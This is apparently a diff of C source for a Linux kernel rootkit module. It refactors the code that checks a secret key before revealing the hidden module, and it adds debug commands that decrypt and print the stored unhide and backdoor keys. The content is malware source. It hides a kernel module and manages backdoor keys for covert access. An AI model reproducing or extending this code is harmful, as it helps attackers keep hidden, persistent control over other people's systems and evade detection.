@@ -69,7 +69,6 @@ uint64_t auto_unhidekey = 0x0000000000000000;
 
 extern uint64_t auto_bdkey;
 
-/** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
 #error "Support is only for x86-64"
 #endif
@@ -481,20 +480,34 @@ static const match_table_t tokens = {
 	{ Opt_unknown, NULL }
 };
 
-struct check_unhidekey_t {
+struct userdata_t {
 	bool ok;
+	int op;
 	uint64_t address_value;
 };
 
-void _unhidekey_callback(const u8 *const buf, size_t buflen, size_t copied,
-			 void *userdata)
+void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
+		void *userdata)
 {
-	struct check_unhidekey_t *validate =
-		(struct check_unhidekey_t *)userdata;
-	if (validate && validate->address_value) {
-		if (validate->address_value == *((uint64_t *)buf))
-			validate->ok = true;
+	struct userdata_t *validate = (struct userdata_t *)userdata;
+
+	if (!validate)
+		return;
+
+	if (validate->op == Opt_unhide_module) {
+		if (validate->address_value) {
+			if (validate->address_value == *((uint64_t *)buf))
+				validate->ok = true;
+		}
 	}
+#ifdef DEBUG_RING_BUFFER
+	else if (validate->op == Opt_get_unhidekey ||
+		 validate->op == Opt_get_bdkey) {
+		char bits[32 + 1] = { 0 };
+		snprintf(bits, 32, "%llx", *((uint64_t *)buf));
+		set_elfbits(bits);
+	}
+#endif
 }
 
 #define CMD_MAXLEN 128
@@ -503,7 +516,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 {
 	pid_t pid;
 	char param[CMD_MAXLEN + 1] = { 0 };
-	decrypt_callback cbkey = (decrypt_callback)_unhidekey_callback;
+	decrypt_callback user_cb = (decrypt_callback)_crypto_cb;
 
 	if (copy_from_user(param, user, CMD_MAXLEN))
 		return -EFAULT;
@@ -538,12 +551,13 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_unhide_module: {
 			uint64_t address_value = 0;
-			struct check_unhidekey_t validate = { 0 };
+			struct userdata_t validate = { 0 };
 
 			if ((sscanf(args[0].from, "%llx", &address_value) ==
 			     1)) {
 				validate.address_value = address_value;
-				kv_decrypt(kvmgc_unhidekey, cbkey, &validate);
+				validate.op = Opt_unhide_module;
+				kv_decrypt(kvmgc_unhidekey, user_cb, &validate);
 				if (validate.ok == true) {
 					kv_unhide_mod();
 				}
@@ -599,15 +613,16 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			}
 		} break;
 #ifdef DEBUG_RING_BUFFER
-		case Opt_get_bdkey: {
-			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%llx", auto_bdkey);
-			set_elfbits(bits);
-		} break;
+		case Opt_get_bdkey:
 		case Opt_get_unhidekey: {
-			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%llx", auto_unhidekey);
-			set_elfbits(bits);
+			struct userdata_t validate = { 0 };
+			struct kv_crypto_st *mgc =
+				(tok == Opt_get_unhidekey ? kvmgc_unhidekey :
+							    kv_sock_get_mgc());
+			decrypt_callback user_cb = (decrypt_callback)_crypto_cb;
+
+			validate.op = tok;
+			kv_decrypt(mgc, user_cb, &validate);
 		} break;
 #endif
 		case Opt_fetch_base_address: {
